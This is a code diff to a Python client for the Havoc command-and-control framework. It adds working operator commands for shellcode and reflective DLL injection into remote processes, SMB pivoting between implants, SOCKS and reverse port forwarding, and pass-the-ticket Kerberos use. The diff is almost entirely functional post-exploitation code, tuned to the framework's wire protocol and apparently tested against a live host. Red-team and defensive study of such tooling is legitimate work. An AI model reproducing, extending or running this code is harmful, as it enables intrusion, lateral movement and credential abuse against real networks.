@@ -152,8 +152,9 @@ COMMANDS: dict[str, dict[str, Any]] = {
                            "implant.coffee.threaded | implant.verbose — "
                            "config <key> <true|false|value>",
                    "verified": True},
-    "screenshot": {"cmd": CMD_SCREENSHOT, "help": "Capture screenshot",
-                   "verified": True},
+    "screenshot": {"cmd": CMD_SCREENSHOT,
+                   "help": "Capture screenshot (fails cleanly with no desktop: ws01 service session has none; needs an interactive logon)",
+                   "verified": False},
     "net":        {"cmd": CMD_NET,
                    "help": "Net recon: domain | computers | sessions | shares | "
                            "dclist | logons",
@@ -181,6 +182,26 @@ COMMANDS: dict[str, dict[str, Any]] = {
                                   "[createremotethread|ntcreatethreadex|"
                                   "ntqueueapcthread] (Way=Execute)",
                           "verified": True},
+    "shellcode-spawn": {"cmd": CMD_INJECT_SHELLCODE,
+                          "help": "Fork a sacrificial process and inject shellcode: "
+                                  "shellcode-spawn <path-in-portal> "
+                                  "[technique] [x64|x86] (Way=Spawn)",
+                          "verified": True},
+    "shellcode-inject": {"cmd": CMD_INJECT_SHELLCODE,
+                           "help": "Inject shellcode into a remote process: "
+                                   "shellcode-inject <pid> <path-in-portal> "
+                                   "[technique] [x64|x86] (Way=Inject)",
+                           "verified": True},
+    "dll-inject": {"cmd": CMD_INJECT_DLL,
+                   "help": "Inject a reflective DLL into a remote process: "
+                           "dll-inject <pid> <path-in-portal> [args] "
+                           "(CommandSend.cc DllInject; Arguments NOT base64)",
+                   "verified": True},
+    "pivot":     {"cmd": CMD_PIVOT,
+                  "help": "Agent pivots (SMB only): pivot list | "
+                          "connect <host> <pipe> | disconnect <id> "
+                          "(numeric Command 1/10/11)",
+                  "verified": True},
     "dll-spawn":  {"cmd": CMD_INJECT_DLL_SPAWN,
                    "help": "Run a DLL in a sacrificial process: "
                            "dll-spawn <path-in-portal> [args] "
@@ -190,8 +211,15 @@ COMMANDS: dict[str, dict[str, Any]] = {
                    "help": "Transfer list/info: transfer list | info <file-id>",
                    "verified": True},
     "socks":      {"cmd": CMD_SOCKET,
-                   "help": "Socks: socks list | start <args> | stop <id> "
-                           "(CommandExecute::Socket)",
+                   "help": "SOCKS5 proxy (served by the TEAMSERVER, daemon relays): "
+                           "socks add <port> | list | kill <port> | clear "
+                           "(ConsoleInput.cc + demons.go SOCKET switch)",
+                   "verified": True},
+    "rportfwd":    {"cmd": CMD_SOCKET,
+                   "help": "Reverse port forward: "
+                           "rportfwd add <lcladdr> <lclport> <fwdaddr> <fwdport> | "
+                           "list | remove <socket-id-hex> | clear "
+                           "(ConsoleInput.cc + demons.go SOCKET switch)",
                    "verified": True},
     "luid":       {"cmd": CMD_KERBEROS,
                    "help": "List logon session IDs (KERBEROS luid)",
@@ -206,6 +234,29 @@ COMMANDS: dict[str, dict[str, Any]] = {
                    "help": "Pass-the-ticket: ptt <ticket-b64> [luid] "
                            "(CommandExecute::Ptt)"},
 }
+
+def _shellcode_opt(bits: list[str]) -> tuple[str, str]:
+    """Shared technique/arch parsing for the shellcode-* family.
+
+    Technique "default" lets the daemon pick (the GUI passes "default" for
+    inject/spawn); a named technique must be one the daemon knows
+    (demons.go:890+). Arch defaults to x64, matching every verified run.
+    """
+    tech, arch = "default", "x64"
+    for bit in bits:
+        low = bit.lower()
+        if low in ("x64", "x86"):
+            arch = low
+        else:
+            tech = bit
+    if tech != "default" and tech not in ("createremotethread",
+                                          "ntcreatethreadex",
+                                          "ntqueueapcthread"):
+        raise BackendError(
+            f"havoc: unknown injection technique '{tech}' "
+            "(createremotethread|ntcreatethreadex|ntqueueapcthread|default)")
+    return tech, arch
+
 
 # Format -> FileType (dispatch.go:883-901)
 FORMATS = {
@@ -658,25 +709,43 @@ class HavocClient:
             extra = {"Binary": base64.b64encode(content).decode(),
                      "Arguments": bits[1] if len(bits) > 1 else ""}
         elif cmd_id == CMD_INJECT_SHELLCODE:
-            # ShellcodeExecute(Technique, Arch, Path, Arguments): Way selects
-            # the injection mode; Technique is the GUI's dropdown index
-            # (1..5) the daemon Atoi's (CommandSend.cc:226-248).
+            # ShellcodeInject/Spawn/Execute(Technique, [PID,] Arch, Path,
+            # Arguments): Way selects the injection mode (CommandSend.cc
+            # :177-248). Technique "default" lets the daemon pick; a named
+            # technique must be one of createremotethread|ntcreatethreadex|
+            # ntqueueapcthread (demons.go:890+).
             bits = rest.split()
-            if not bits:
-                raise BackendError(
-                    "havoc: shellcode-execute needs <path-in-portal> "
-                    "[technique]")
-            try:
-                content = open(bits[0], "rb").read()
-            except OSError as exc:
-                raise BackendError(
-                    f"havoc: cannot read shellcode {bits[0]}: {exc}")
-            extra = {"Way": "Execute",
-                     "Technique": bits[1] if len(bits) > 1
-                     else "createremotethread",
-                     "Binary": base64.b64encode(content).decode(),
-                     "Arguments": "",
-                     "Arch": "x64"}
+            if name == "shellcode-inject":
+                if len(bits) < 2 or not bits[0].isdigit():
+                    raise BackendError(
+                        "havoc: shellcode-inject needs <pid> <path-in-portal> "
+                        "[technique] [x64|x86]")
+                pid, path = bits[0], bits[1]
+                tech, arch = _shellcode_opt(bits[2:])
+                try:
+                    content = open(path, "rb").read()
+                except OSError as exc:
+                    raise BackendError(
+                        f"havoc: cannot read shellcode {path}: {exc}")
+                extra = {"Way": "Inject", "Technique": tech,
+                         "Binary": base64.b64encode(content).decode(),
+                         "Arguments": "", "PID": pid, "Arch": arch}
+            else:
+                if not bits:
+                    raise BackendError(
+                        f"havoc: {name} needs <path-in-portal> [technique] "
+                        "[x64|x86]")
+                tech, arch = _shellcode_opt(bits[1:])
+                try:
+                    content = open(bits[0], "rb").read()
+                except OSError as exc:
+                    raise BackendError(
+                        f"havoc: cannot read shellcode {bits[0]}: {exc}")
+                extra = {"Way": ("Spawn" if name == "shellcode-spawn"
+                                 else "Execute"),
+                         "Technique": tech,
+                         "Binary": base64.b64encode(content).decode(),
+                         "Arguments": "", "Arch": arch}
         elif cmd_id == CMD_INJECT_DLL_SPAWN:
             # DllSpawn(Path, Args): Binary base64, Arguments base64.
             bits = rest.split(None, 1)
@@ -688,18 +757,84 @@ class HavocClient:
                 raise BackendError(f"havoc: cannot read DLL {bits[0]}: {exc}")
             extra = {"Binary": base64.b64encode(content).decode(),
                      "Arguments": self._b64(bits[1] if len(bits) > 1 else "")}
+        elif cmd_id == CMD_INJECT_DLL:
+            # DllInject(PID, Binary, Arguments): Arguments is the RAW params
+            # string, NOT base64 (CommandSend.cc:324-344) — unlike DllSpawn.
+            bits = rest.split(None, 2)
+            if len(bits) < 2 or not bits[0].isdigit():
+                raise BackendError(
+                    "havoc: dll-inject needs <pid> <path-in-portal> [args]")
+            try:
+                content = open(bits[1], "rb").read()
+            except OSError as exc:
+                raise BackendError(
+                    f"havoc: cannot read DLL {bits[1]}: {exc}")
+            extra = {"Binary": base64.b64encode(content).decode(),
+                     "Arguments": bits[2] if len(bits) > 2 else "",
+                     "PID": bits[0]}
+        elif cmd_id == CMD_PIVOT:
+            # Pivot(Command, Param): Command is NUMERIC ("1"=list, "10"=SMB
+            # connect, "11"=disconnect — ConsoleInput.cc:2134+; only Smb is
+            # implemented, "TODO: For now only Smb").
+            bits = rest.split(None, 2)
+            if not bits:
+                raise BackendError(
+                    "havoc: pivot needs list | connect <host> <pipe> | "
+                    "disconnect <id>")
+            sub = bits[0].lower()
+            if sub == "list":
+                extra = {"Command": "1", "Param": ""}
+            elif sub == "connect":
+                if len(bits) != 3:
+                    raise BackendError(
+                        "havoc: pivot connect needs <host> <pipe>")
+                extra = {"Command": "10",
+                         "Param": "\\\\" + bits[1] + "\\pipe\\" + bits[2]}
+            elif sub == "disconnect":
+                if len(bits) != 2:
+                    raise BackendError(
+                        "havoc: pivot disconnect needs <id>")
+                extra = {"Command": "11", "Param": bits[1]}
+            else:
+                raise BackendError(
+                    "havoc: pivot needs list | connect <host> <pipe> | "
+                    "disconnect <id>")
         elif cmd_id == CMD_TRANSFER:
             # Transfer(SubCommand, FileID) (CommandSend.cc:464-481).
             bits = rest.split(None, 1)
             extra = {"Command": bits[0] if bits else "list",
                      "FileID": bits[1] if len(bits) > 1 else ""}
         elif cmd_id == CMD_SOCKET:
-            # Socket(SubCommand, Params) — socks/pivot/rportfwd share it.
-            bits = rest.split(None, 1)
-            if not bits:
-                raise BackendError("havoc: socks needs list|start|stop ...")
-            extra = {"Command": bits[0],
-                     "Params": bits[1] if len(bits) > 1 else ""}
+            # Socket(SubCommand, Params) — socks/rportfwd share it. The
+            # teamserver switches on the FULL two-word subcommand
+            # ("socks add", "rportfwd list", ... — demons.go TaskPrepare),
+            # with NO default case: sending just "socks" silently becomes an
+            # empty job the daemon misreads (once observed as "start a
+            # reverse port forward on 0.0.0.0:0"). So join the first two
+            # words as the subcommand, exactly like the GUI does. Note:
+            # run() already stripped the verb, so re-attach it here.
+            words = [name] + rest.split()
+            if len(words) < 2 or words[0] not in ("socks", "rportfwd"):
+                raise BackendError(
+                    "havoc: use 'socks add <port> | list | kill <port> | clear' "
+                    "or 'rportfwd add <lcladdr> <lclport> <fwdaddr> <fwdport> | "
+                    "list | remove <id> | clear'")
+            if words[1] not in ("add", "list", "kill", "clear", "remove"):
+                raise BackendError(
+                    f"havoc: unknown socket subcommand '{words[0]} {words[1]}'")
+            sub = f"{words[0]} {words[1]}"
+            tail = words[2:]
+            if sub == "rportfwd add":
+                # GUI sends "LclAddr;LclPort;FwdAddr;FwdPort" (ConsoleInput.cc)
+                # — the teamserver splits Params on ";".
+                if len(tail) != 4:
+                    raise BackendError(
+                        "havoc: rportfwd add needs 4 args: "
+                        "<lcladdr> <lclport> <fwdaddr> <fwdport>")
+                params = ";".join(tail)
+            else:
+                params = " ".join(tail)
+            extra = {"Command": sub, "Params": params}
         elif cmd_id == CMD_KERBEROS:
             # KERBEROS frames: luid (no args), klist (Argument1/2),
             # purge (Argument), ptt (Ticket, Luid) (CommandSend.cc:502-580).
@@ -713,11 +848,25 @@ class HavocClient:
             elif name == "purge":
                 extra = {"Command": "purge", "Argument": rest}
             elif name == "ptt":
-                bits = rest.split(None, 1)
+                # GUI: `ptt <ticket-b64> [/luid <luid>]`, default Luid "0"
+                # (ConsoleInput.cc:2267+). The teamserver base64-decodes
+                # Ticket and hex-parses Luid — an empty Luid errors, so
+                # default it like the GUI does instead of sending "".
+                bits = rest.split()
                 if not bits:
-                    raise BackendError("havoc: ptt needs <ticket-b64> [luid]")
-                extra = {"Command": "ptt", "Ticket": bits[0],
-                         "Luid": bits[1] if len(bits) > 1 else ""}
+                    raise BackendError(
+                        "havoc: ptt needs <ticket-b64> [/luid <luid>]")
+                ticket = bits[0]
+                luid = "0"
+                if len(bits) > 1:
+                    if bits[1] == "/luid" and len(bits) > 2:
+                        luid = bits[2]
+                    elif len(bits) == 2:
+                        luid = bits[1]
+                    else:
+                        raise BackendError(
+                            "havoc: ptt needs <ticket-b64> [/luid <luid>]")
+                extra = {"Command": "ptt", "Ticket": ticket, "Luid": luid}
         # CHECKIN / SCREENSHOT carry no extra keys. PROC_LIST requires
         # FromProcessManager ("true"/"false" strings): omitting it crashes
         # the teamserver (Go panic on the missing key -> container restart).
